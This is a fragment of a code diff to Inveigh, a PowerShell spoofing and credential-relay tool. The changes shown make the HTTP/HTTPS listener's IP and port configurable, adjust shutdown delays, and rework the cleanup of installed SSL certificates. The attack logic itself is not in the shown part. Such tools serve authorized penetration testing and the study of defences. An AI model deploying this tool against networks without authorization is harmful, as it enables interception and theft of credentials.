+                            $inveigh.log.Add("$(Get-Date -format 's') - SSL Certificate Deletion Error - Remove Manually")  > $null
+
+                            if($inveigh.file_output)
+                            {
+                                "$(Get-Date -format 's') - SSL Certificate Deletion Error - Remove Manually" | Out-File $Inveigh.log_out_file -Append   
+                            }
+
                         }
 
-                        $inveigh.log.Add("$(Get-Date -format 's') - SSL Certificate Deletion Error - Remove Manually")
-
-                        if($inveigh.file_output)
-                        {
-                            "$(Get-Date -format 's') - SSL Certificate Deletion Error - Remove Manually" | Out-File $Inveigh.log_out_file -Append   
-                        }
-                    
                     }
 
                 }
@@ -2034,14 +2183,34 @@ function HTTPListener()
 {
     $inveigh.HTTP_listener = New-Object System.Net.HttpListener
 
-    if($inveigh.HTTP)
+    if($HTTP -eq 'Y')
     {
-        $inveigh.HTTP_listener.Prefixes.Add('http://*:80/')
+    
+        if($HTTPIP -eq '0.0.0.0')
+        {
+            $HTTP_prefix = "http://*:$HTTPPort/"
+        }
+        else
+        {
+            $HTTP_prefix = "http://$HTTPIP`:$HTTPPort/"
+        }
+
+        $inveigh.HTTP_listener.Prefixes.Add($HTTP_prefix)
     }
 
-    if($inveigh.HTTPS)
+    if($HTTPS -eq 'Y')
     {
-        $inveigh.HTTP_listener.Prefixes.Add('https://*:443/')
+
+        if($HTTPIP -eq '0.0.0.0')
+        {
+            $HTTPS_prefix = "https://*:$HTTPSPort/"
+        }
+        else
+        {
+            $HTTPS_prefix = "https://$HTTPIP`:$HTTPSPort/"
+        }
+
+        $inveigh.HTTP_listener.Prefixes.Add($HTTPS_prefix)
     }
 
     $inveigh.HTTP_listener.AuthenticationSchemes = "Anonymous" 
@@ -2082,7 +2251,7 @@ function SnifferSpoofer()
 # Startup Enabled Services
 
 # HTTP Server Start
-if($inveigh.HTTP -or $inveigh.HTTPS)
+if($HTTP -eq 'Y' -or $HTTPS -eq 'Y')
 {
     HTTPListener
 }
@@ -2292,7 +2461,7 @@ if($inveigh)
         if($inveigh.unprivileged_running)
         {
             $inveigh.unprivileged_running = $false
-            Start-Sleep -s 5
+            Start-Sleep -S 2
             Write-Output("Inveigh Unprivileged exited at $(Get-Date -format 's')")
             $inveigh.log.Add("$(Get-Date -format 's') - Inveigh Unprivileged exited")  > $null
 
@@ -2306,6 +2475,7 @@ if($inveigh)
         if($inveigh.relay_running)
         {
             $inveigh.relay_running = $false
+            Start-Sleep -S 2
             Write-Output("Inveigh Relay exited at $(Get-Date -format 's')")
             $inveigh.log.Add("$(Get-Date -format 's') - Inveigh Relay exited")  > $null
 
@@ -2337,27 +2507,45 @@ if($inveigh)
     
     if($inveigh.HTTPS)
     {
-        & "netsh" http delete sslcert ipport=0.0.0.0:443 > $null
+        $certificate_check = & "netsh" http show sslcert
 
-        try
+        if($certificate_check)
         {
-            $certificate_store = New-Object System.Security.Cryptography.X509Certificates.X509Store("My","LocalMachine")
-            $certificate_store.Open('ReadWrite')
-            $certificate = $certificate_store.certificates.Find("FindByThumbprint",$inveigh.certificate_thumbprint,$FALSE)[0]
-            $certificate_store.Remove($certificate)
-            $certificate_store.Close()
+            $netsh_ipport = "ipport=" + $inveigh.HTTPS_IP + ":" + $inveigh.HTTPS_port
+            $netsh_arguments = @("http","delete","sslcert",$netsh_ipport)
+            & "netsh" $netsh_arguments > $null
         }
-        catch
-        {
-            Write-Output("SSL Certificate Deletion Error - Remove Manually")
-            $inveigh.log.Add("$(Get-Date -format 's') - SSL Certificate Deletion Error - Remove Manually")  > $null
 
-            if($inveigh.file_output)
+        if(!$inveigh.HTTPS_existing_certificate -or ($inveigh.HTTPS_existing_certificate -and $inveigh.HTTPS_force_certificate_delete))
+        {
+
+            try
             {
-                "$(Get-Date -format 's') - SSL Certificate Deletion Error - Remove Manually" | Out-File $Inveigh.log_out_file -Append   
+                $certificate_store = New-Object System.Security.Cryptography.X509Certificates.X509Store("My","LocalMachine")
+                $certificate_store.Open('ReadWrite')
+                $certificates = (Get-ChildItem Cert:\LocalMachine\My | Where-Object {$_.Issuer -Like "CN=" + $inveigh.certificate_issuer})
+
+                ForEach($certificate in $certificates)
+                {
+                    $certificate_store.Remove($certificate)
+                }
+
+                $certificate_store.Close()
+            }
+            catch
+            {
+                Write-Output("SSL Certificate Deletion Error - Remove Manually")
+                $inveigh.log.Add("$(Get-Date -format 's') - SSL Certificate Deletion Error - Remove Manually")  > $null
+
+                if($inveigh.file_output)
+                {
+                    "$(Get-Date -format 's') - SSL Certificate Deletion Error - Remove Manually" | Out-File $Inveigh.log_out_file -Append   
+                }
+
             }
 
         }
+
     }
 
     $inveigh.HTTP = $false
@@ -2368,7 +2556,7 @@ else
     Write-Output("There are no running Inveigh functions")|Out-Null
 }
 
-} 
+}  
 
 function Get-Inveigh
 {
